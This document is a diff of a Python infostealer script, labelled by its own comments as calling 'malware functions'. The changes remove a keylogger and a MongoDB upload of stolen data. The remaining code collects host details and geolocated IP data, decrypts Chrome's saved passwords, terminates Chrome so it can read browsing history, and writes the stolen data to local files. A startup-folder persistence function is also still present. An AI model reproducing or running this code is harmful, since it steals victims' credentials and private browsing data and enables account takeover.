@@ -1,23 +1,30 @@
-import os
-import sys
-import wmi
-import json
-import base64
-import socket
-import psutil
-import requests
-import platform
-import win32crypt
-from Cryptodome.Cipher import AES
-import sqlite3
-import shutil
-import subprocess
-from pynput import keyboard
-from pynput.keyboard import Key
-from pymongo import MongoClient
-from datetime import timezone, datetime, timedelta
+import os, wmi, json, base64, psutil, requests, platform, win32crypt, sqlite3, shutil
+from Crypto.Cipher import AES
+from browser_history import get_history
 
-cluster = MongoClient() #your database here
+def kill_chrome():
+    for proc in psutil.process_iter(['pid', 'name']):
+        if 'chrome' in proc.info['name'].lower():
+            print(f"Terminating Chrome process with PID {proc.pid}")
+            proc.terminate()
+
+def write_data(data , where='usr_info'):
+    #for some reasons i could not add data to text normaly
+    #from functions (calling write_data every time with one param)
+    #it did not add data as expected. maybe im stupid (likely), and thats the reason.
+    #anyway, you can try to play with it, but mine solution was to pass a list of args directly
+    #you can try to improve it
+
+    path = 'logs'
+    d = os.path.join(path, where+'.txt')
+
+    if not os.path.exists(path):
+        os.mkdir(path)
+
+    with open(d, 'w', encoding='utf-8') as file:
+        for item in data:
+            file.write(str(item)+'\n')
+            file.write('\n')
 
 #copy file for autostart
 def copy_to_startup():
@@ -31,9 +38,8 @@ def copy_to_startup():
         print("Script already in startup folder.")
 
 #computer information and network
-def recon():
-    db = cluster["keyloger"]
-    collection = db["devices"]
+def user_info():
+    print('extarcting user data')
     computer_name = platform.node()
     os = platform.system()
     os_version = platform.release()
@@ -49,12 +55,28 @@ def recon():
     print(f'Total RAM: {ram.total / (1024 ** 3):.2f} GB')
     response = requests.get("https://api.ipify.org")
     public_ip = response.text
-    ip_info = requests.get(f"https://ipapi.co/{public_ip}/json/").json()
-    country = ip_info['country_name']
+    ip_info = requests.get(f"http://ip-api.com/json/{public_ip}").json()
+    country = ip_info['country']
     city = ip_info["city"]
     organization = ip_info["org"]
-    post = {"Device": computer_name, "Operating system": os+" "+os_version, "Cpu": cpu.Name, "Gpu": gpu.Name, "Drive name": disk.Caption, "Drive size": f'{total_space / (1024 ** 3):.2f} GB', "Ram": f'{ram.total / (1024 ** 3):.2f} GB', "Public ip": public_ip, "Country": country, "City": city, "Provider": organization}
-    collection.insert_one(post)
+
+    res = [
+        {"Device": computer_name},
+        {"Operating system": os+" "+os_version},
+        {"Cpu": cpu.Name},
+        {"Gpu": gpu.Name},
+        {"Drive name": disk.Caption},
+        {"Drive size": f'{total_space / (1024 ** 3):.2f} GB'},
+        {"Ram": f'{ram.total / (1024 ** 3):.2f} GB'},
+        {"Public ip": public_ip},
+        {"Country": country},
+        {"City": city},
+        {"Provider": organization}
+    ]
+    
+    print('saving result to txt..')
+    write_data(res)
+    print('saved')
 
 #password extractor
 def fetching_encryption_key():
@@ -89,16 +111,15 @@ def password_decryption(password, encryption_key):
             return "No Passwords"
   
   
-def main():
+def user_passwords():
     print("Extracting passwords")
-    db = cluster["keyloger"]
-    collection = db["devices_passwords_logins"]
     
     key = fetching_encryption_key()
     db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local","Google", "Chrome", "User Data", "default", "Login Data")
     filename = "ChromePasswords.db"
     shutil.copyfile(db_path, filename)
-      
+    res = []
+
     db = sqlite3.connect(filename)
     cursor = db.cursor()
       
@@ -113,11 +134,16 @@ def main():
         last_usuage = row[5]
           
         if user_name or decrypted_password:
-            post = {"login Url":login_page_url, "Username": user_name, "Password":decrypted_password}
-            collection.insert_one(post)
-          
+            res.append({ 
+                "login Url":login_page_url, 
+                "Username": user_name, 
+                "Password":decrypted_password,
+            })          
         else:
             continue
+        
+    write_data(res, 'pswds')
+    print('saved')
     cursor.close()
     db.close()
       
@@ -127,46 +153,23 @@ def main():
         pass
 
 #history extractor
+
 def user_history_data():
     print("Extracting history data")
-    db = cluster["keyloger"]
-    collection = db["devices_history"]
+    kill_chrome()
+    browsers = get_history()
+    formated = []
 
-    path = r"\AppData\Local\Google\Chrome\User Data\Default"
-
-    os.chdir(os.path.join(os.environ["USERPROFILE"] + path))
-    con = sqlite3.connect("History")
-    cursor = con.cursor()
-
-    for i in cursor.execute("SELECT * from urls"):
-        post = {"website name": i[2], "website url": i[1]}
-        collection.insert_one(post)
-    print("Running keyloger")
-
-#keylogs
-keys = []
-
-def on_press(key):
-    global keys, host_name
-    db = cluster["keyloger"]
-    collection = db["devices"]
-    keys.append(key)
-    if key == Key.enter:
-        data = str(keys).replace("'","").replace(",","").replace("[","").replace("]","").replace("<Key.space:  >"," ").replace("<Key.enter: <13>>","").replace("<Key.shift: <160>>", "")
-        post = {"device": str(host_name), "text log": data}
-        collection.insert_one(post)
-        keys = []
-
-def on_release(key):
-    if key == keyboard.Key.esc:
-        return False
+    for item in browsers.histories:
+        given_datetime = item[0]
+        item = ( given_datetime.strftime("%Y-%m-%d %H:%M:%S %Z"), item[2], item[1] )
+        formated.append(item)
+    
+    write_data(formated, 'hstry')
+    print('saved')
 
 #calling malware functions
-copy_to_startup()
-recon()
-main()
+    
+user_info()
+user_passwords()
 user_history_data()
-with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
-    listener.join()
-listener = keyboard.Listener(on_press=on_press,on_release=on_release)
-listener.start()
